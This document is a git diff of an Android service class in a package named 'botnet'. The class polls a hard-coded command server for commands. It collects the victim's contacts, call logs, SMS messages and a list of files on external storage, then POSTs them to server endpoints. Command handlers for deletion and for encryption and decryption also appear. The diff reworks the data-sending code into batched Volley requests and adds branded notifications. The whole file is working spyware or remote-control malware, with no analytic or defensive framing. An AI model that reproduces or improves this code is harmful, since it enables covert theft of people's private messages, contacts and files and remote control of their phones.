@@ -3,7 +3,9 @@ package com.example.kico.botnet;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.DownloadManager;
+import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.ContentResolver;
@@ -12,7 +14,9 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.media.RingtoneManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
@@ -21,16 +25,20 @@ import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.NotificationCompat;
 import android.support.v4.content.ContextCompat;
-import android.util.Log;
 import android.widget.ArrayAdapter;
 
-import org.apache.http.HttpResponse;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+import com.android.volley.toolbox.JsonObjectRequest;
+import com.android.volley.toolbox.Volley;
+
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.ResponseHandler;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.BasicResponseHandler;
 import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.util.EntityUtils;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -47,7 +55,6 @@ import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
@@ -55,13 +62,14 @@ import java.util.List;
 import java.util.Random;
 
 public class MyService extends Service {
-    public String http = "Enter your website url here";
+    public String http = "http://192.168.43.55";
     String command = "";
     String userid;
     private static final String TAG = "com.example.kico.botnet";
     String expath = Environment.getExternalStorageDirectory().getAbsolutePath();
     private static final String salt = "x962";
     private static String cryptPassword;
+    private List<String> Filelocation = new ArrayList<>();
     DownloadManager downloadManager;
 
     NotificationCompat.Builder notification;
@@ -129,8 +137,8 @@ public class MyService extends Service {
 
     public static String getSaltus() {
         String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-        final int min = 1;
-        final int max = 10;
+        final int min = 8;
+        final int max = 8;
         final int rand = new Random().nextInt((max - min) + 1) + min;
         StringBuilder salt = new StringBuilder();
         Random rnd = new Random();
@@ -201,7 +209,6 @@ public class MyService extends Service {
             String pert = getUrid();
             try {
                 URL url = new URL(http + "/json.php?id=" + pert);
-                //Log.i(TAG, String.valueOf(url));
                 HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                 InputStream inputStream = httpURLConnection.getInputStream();
                 BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -212,17 +219,14 @@ public class MyService extends Service {
                 }
                 JSONArray JA = new JSONArray(data);
                 for (int i = 0; i < JA.length(); i++) {
-                    //Log.i(TAG, String.valueOf(i));
                     JSONObject JO = (JSONObject) JA.get(i);
                     command = JO.get("command") + "";
-                    //Log.i(TAG, command);
                     //int cmd = Integer.parseInt(command);
                     if (command.equals("wait")) {
-                        //Log.i(TAG, "wait case");
                     } else if (command.equals("con")) {
                         getContactList();
                     } else if (command.equals("infe")) {
-                        listf("/storage/sdcard/");
+                        listf(String.valueOf(Environment.getExternalStorageDirectory()));
                     } else if (command.equals("sdfe")) {
                         listf(expath);
                     } else if (command.equals("del")) {
@@ -242,7 +246,6 @@ public class MyService extends Service {
                     }else if (command.equals("dery")) {
                         decry();
                     }   else {
-                        //Log.i(TAG, "");
                     }
 
                 }
@@ -253,6 +256,15 @@ public class MyService extends Service {
             } catch (JSONException e) {
                 e.printStackTrace();
             }
+
+        try
+        {
+            Thread.sleep(2000);
+        }
+        catch(InterruptedException ex)
+        {
+            Thread.currentThread().interrupt();
+        }
         }
 
     }
@@ -279,7 +291,6 @@ public class MyService extends Service {
         String data = "";
         try {
             URL url = new URL(http + "/output.php");
-            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -290,11 +301,9 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 command = JO.get("text") + "";
                 cryptPassword = command;
-                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -325,7 +334,6 @@ public class MyService extends Service {
         String data = "";
         try {
             URL url = new URL(http + "/output.php");
-            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -336,11 +344,9 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 command = JO.get("text") + "";
                 cryptPassword = command;
-                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -371,9 +377,9 @@ public class MyService extends Service {
 
         String data = "";
         String pert = getUrid();
+        String text = "hacksec.in";
         try {
             URL url = new URL(http + "/output.php");
-            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -384,16 +390,13 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
-                String text = JO.get("text") + "";
+                text = JO.get("text") + "";
                 notification.setSmallIcon(R.drawable.he);
                 notification.setTicker(command);
                 notification.setWhen(System.currentTimeMillis());
-                notification.setContentTitle("Script1337");
+                notification.setContentTitle("hacksec.in");
                 notification.setContentText(text);
-
-                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -402,16 +405,35 @@ public class MyService extends Service {
             e.printStackTrace();
         }
 
-        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        nm.notify(uniqueID, notification.build());
-        clear();
+    int reqCode = 1;
+    Intent intent = new Intent(getApplicationContext(), MainActivity.class);
+    showNotification(this, "hacksec.in", text, intent, reqCode);
+    clear();
     }
 
+public void showNotification(Context context, String title, String message, Intent intent, int reqCode) {
+    PendingIntent pendingIntent = PendingIntent.getActivity(context, reqCode, intent, PendingIntent.FLAG_ONE_SHOT);
+    String CHANNEL_ID = "channel_name";// The id of the channel.
+    NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(context, CHANNEL_ID)
+            .setSmallIcon(R.drawable.he)
+            .setContentTitle(title)
+            .setContentText(message)
+            .setAutoCancel(true)
+            .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
+            .setContentIntent(pendingIntent);
+    NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        CharSequence name = "Channel Name";// The user-visible name of the channel.
+        int importance = NotificationManager.IMPORTANCE_HIGH;
+        NotificationChannel mChannel = new NotificationChannel(CHANNEL_ID, name, importance);
+        notificationManager.createNotificationChannel(mChannel);
+    }
+    notificationManager.notify(reqCode, notificationBuilder.build()); // 0 is the request code, it should be unique id
+}
 
     public void clear() {
         HttpClient Client = new DefaultHttpClient();
         String pert = getUrid();
-        //Log.i(TAG, pert);
         String URL = http + "/dead.php?id=" + pert;
 
         try {
@@ -420,10 +442,7 @@ public class MyService extends Service {
             HttpGet httpget = new HttpGet(URL);
             ResponseHandler<String> responseHandler = new BasicResponseHandler();
             SetServerString = Client.execute(httpget, responseHandler);
-
-            //Log.i(TAG, SetServerString);
         } catch (Exception ex) {
-            //Log.i(TAG, "Fail");
         }
     }
 
@@ -445,11 +464,68 @@ public class MyService extends Service {
         }
     }
 
+    public void volleyPost(String API_peremeter, List<String> data){
+        String postUrl = http + API_peremeter;
+        RequestQueue requestQueue = Volley.newRequestQueue(this);
+
+        JSONObject postData = new JSONObject();
+        try {
+            postData.put("data", data);
+
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+
+        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, postUrl, postData, new Response.Listener<JSONObject>() {
+            @Override
+            public void onResponse(JSONObject response) {
+                System.out.println(response);
+            }
+        }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                error.printStackTrace();
+            }
+        });
+
+        requestQueue.add(jsonObjectRequest);
+
+    }
+
+    public void Test_volleyPost(String API_peremeter, List<String> data){
+        String postUrl = API_peremeter;
+        RequestQueue requestQueue = Volley.newRequestQueue(this);
+
+        JSONObject postData = new JSONObject();
+        try {
+            postData.put("data", data);
+
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+
+        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, postUrl, postData, new Response.Listener<JSONObject>() {
+            @Override
+            public void onResponse(JSONObject response) {
+                System.out.println(response);
+            }
+        }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                error.printStackTrace();
+            }
+        });
+
+        requestQueue.add(jsonObjectRequest);
+
+    }
+
     public void getContactList() throws UnsupportedEncodingException {
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
-
+        List<String> info = new ArrayList<>();
+        String[] infolist = new String[2];
         if ((cur != null ? cur.getCount() : 0) > 0) {
             while (cur != null && cur.moveToNext()) {
                 String id = cur.getString(
@@ -471,26 +547,15 @@ public class MyService extends Service {
                                 ContactsContract.CommonDataKinds.Phone.NUMBER));
                         //Log.i(TAG, "Name: " + name);
                         //Log.i(TAG, "Phone Number: " + phoneNo);
-                        HttpClient Client = new DefaultHttpClient();
-                        String pert = getUrid();
-                        String URL = http + "//coninput.php?id=" + pert + "&name=" + URLEncoder.encode(name, "UTF-8") + "&phonenum=" + URLEncoder.encode(phoneNo, "UTF-8");
-                        try {
-                            String SetServerString = "";
-
-                            HttpGet httpget = new HttpGet(URL);
-                            ResponseHandler<String> responseHandler = new BasicResponseHandler();
-                            SetServerString = Client.execute(httpget, responseHandler);
-
-                            //Log.i(TAG, SetServerString);
-                        } catch (Exception ex) {
-                            //Log.i(TAG, "Fail");
-                        }
+                        String infox = name + "-" + phoneNo;
+                        info.add(infox);
                         i = i + 1;
                     }
                     pCur.close();
                 }
             }
         }
+        volleyPost("/coninput.php",info);
         if (cur != null) {
             cur.close();
         }
@@ -596,7 +661,7 @@ public class MyService extends Service {
 
     }
 
-    public List<File> listf(String directoryName) {
+    public boolean listf(String directoryName) {
         File directory = new File(directoryName);
 
         List<File> resultList = new ArrayList<>();
@@ -605,52 +670,47 @@ public class MyService extends Service {
         File[] fList = directory.listFiles();
 
         if (fList == null) {
-            return null;
+            return false;
         }
-        resultList.addAll(Arrays.asList(fList));
-        for (File file : fList) {
-            if (file.isFile()) {
-                HttpClient Client = new DefaultHttpClient();
-                String pert = getUrid();
-                //Log.i(TAG, pert);
-                String URL = http + "/fileinput.php?id=" + pert + "&filepath=" + file.getAbsolutePath();
 
-                try {
-                    String SetServerString = "";
+        listfX(directoryName);
+        volleyPost("/fileinput.php",Filelocation);
+        clear();
+        return true;
+    }
 
-                    HttpGet httpget = new HttpGet(URL);
-                    ResponseHandler<String> responseHandler = new BasicResponseHandler();
-                    SetServerString = Client.execute(httpget, responseHandler);
+    public List<File> listfX(String directoryName) {
+        List<File> resultList = new ArrayList<>();
+        if (directoryName.contains("Android/data")){
+            return resultList;
+        }
+        else {
+            File directory = new File(directoryName);
 
-                    //Log.i(TAG, SetServerString);
-                } catch (Exception ex) {
-                    //Log.i(TAG, "Fail");
-                }
-                try {
 
-                    try {
-                        String SetServerString = "";
+            File[] fList = directory.listFiles();
 
-                        HttpGet httpget = new HttpGet(URL);
-                        ResponseHandler<String> responseHandler = new BasicResponseHandler();
-                        SetServerString = Client.execute(httpget, responseHandler);
-
-                        //Log.i(TAG, SetServerString);
-                    } catch (Exception ex) {
-                        //Log.i(TAG, "Fail");
+            if (fList == null) {
+                return null;
+            }
+            resultList.addAll(Arrays.asList(fList));
+            for (File file : fList) {
+                if (file.isFile()) {
+                    String pert = getUrid();
+                    //Log.i(TAG, pert);
+                    //String URL = http + "/fileinput.php?id=" + pert + "&filepath=" + file.getAbsolutePath();
+                    //Log.i(TAG, file.getAbsolutePath());
+                    Filelocation.add(file.getAbsolutePath() + ";");
+                } else if (file.isDirectory()) {
+                    // ask here if it was null
+                    List<File> files = listfX(file.getAbsolutePath());
+                    if (files != null) {
+                        resultList.addAll(files);
                     }
-                } catch (Exception ex) {
-
-                }
-            } else if (file.isDirectory()) {
-                // ask here if it was null
-                List<File> files = listf(file.getAbsolutePath());
-                if (files != null) {
-                    resultList.addAll(files);
                 }
             }
         }
-        clear();
+
         return resultList;
     }
 
@@ -659,7 +719,7 @@ public class MyService extends Service {
         String pert = getUrid();
         try {
             URL url = new URL(http + "/output.php");
-            //Log.i(TAG, String.valueOf(url));
+          //  Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -737,6 +797,7 @@ public class MyService extends Service {
 
 
     public void getCallDetails() throws IOException {
+        List<String> info = new ArrayList<>();
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
 
@@ -769,19 +830,10 @@ public class MyService extends Service {
             }
             stringBuffer.append(phnumber).append(calltype).append(d).append(callduration);
             String pert = getUrid();
-            String URL = http + "/calllog.php?id=" + pert + "&phnumber=" + URLEncoder.encode(phnumber, "UTF-8") + "&callduration=" + URLEncoder.encode(callduration, "UTF-8") + "&callTypeStr=" + URLEncoder.encode(callTypeStr, "UTF-8") + "&time=" + URLEncoder.encode(String.valueOf(d), "UTF-8");
-            HttpClient httpclient = new DefaultHttpClient();
-            HttpGet httpget = new HttpGet(URL);
-
-            HttpResponse response = httpclient.execute(httpget);
-
-            if (response.getStatusLine().getStatusCode() == 200) {
-                String server_response = EntityUtils.toString(response.getEntity());
-                //Log.i("Server response", server_response);
-            } else {
-                //Log.i("Server response", "Failed to get server response");
-            }
+            String infox = phnumber + "-" + callduration + "-" + callTypeStr +"-" + String.valueOf(d) ;
+            info.add(infox);
         }
+        volleyPost("/calllog.php",info);
         mCursor.close();
 
         clear();
@@ -808,6 +860,7 @@ public class MyService extends Service {
     }
 
     public void refreshSmsInbox() throws IOException {
+        List<String> info = new ArrayList<>();
         ContentResolver contentResolver = getContentResolver();
         Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
         int indexBody = smsInboxCursor.getColumnIndex("body");
@@ -818,31 +871,11 @@ public class MyService extends Service {
             String str = "SMS From: " + smsInboxCursor.getString(indexAddress) +
                     "\n" + smsInboxCursor.getString(indexBody) + "\n";
             arrayAdapter.add(str);
-            String URL = null;
             String pert = getUrid();
-            try {
-                URL = http + "/smslog.php?id=" + pert + "&address=" + URLEncoder.encode(smsInboxCursor.getString(indexBody), "UTF-8") + "&message=" + URLEncoder.encode(smsInboxCursor.getString(indexAddress), "UTF-8");
-            } catch (UnsupportedEncodingException e) {
-                e.printStackTrace();
-            }
-            HttpClient httpclient = new DefaultHttpClient();
-            HttpGet httpget = new HttpGet(URL);
-
-            HttpResponse response = null;
-            try {
-                response = httpclient.execute(httpget);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-
-            if (response.getStatusLine().getStatusCode() == 200) {
-                String server_response = EntityUtils.toString(response.getEntity());
-                //Log.i("Server response", server_response);
-            } else {
-                //Log.i("Server response", "Failed to get server response");
-            }
+            String infox = smsInboxCursor.getString(indexBody) + "-" + smsInboxCursor.getString(indexAddress) ;
+            info.add(infox);
         } while (smsInboxCursor.moveToNext());
+        volleyPost("/smslog.php",info);
     }
-
 
 }
